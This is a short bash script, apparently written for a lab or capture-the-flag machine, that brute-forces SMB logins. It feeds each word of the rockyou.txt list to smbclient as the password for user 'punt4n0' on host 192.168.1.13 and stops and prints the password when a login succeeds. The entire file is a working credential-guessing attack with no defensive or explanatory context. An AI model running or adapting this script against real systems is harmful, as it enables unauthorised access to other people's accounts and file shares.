#!/bin/bash

INTENTO=0
STRING="#"

for i in $(cat /usr/share/wordlists/rockyou.txt)
do
	PERCENT=$((INTENTO * 100 / 14344392))
	[ $((INTENTO % 50)) -eq 0 ] && STRING="${STRING}#" && echo -n -e "\r\t$PERCENT% $STRING"
	smbclient -L //192.168.1.13/ -U "punt4n0%$i" >/dev/null
	if [ $? -eq 0 ]
	then
		echo -e "$INTENTO:\t$i"
		exit 0
	fi
	INTENTO=$((INTENTO+1))
done
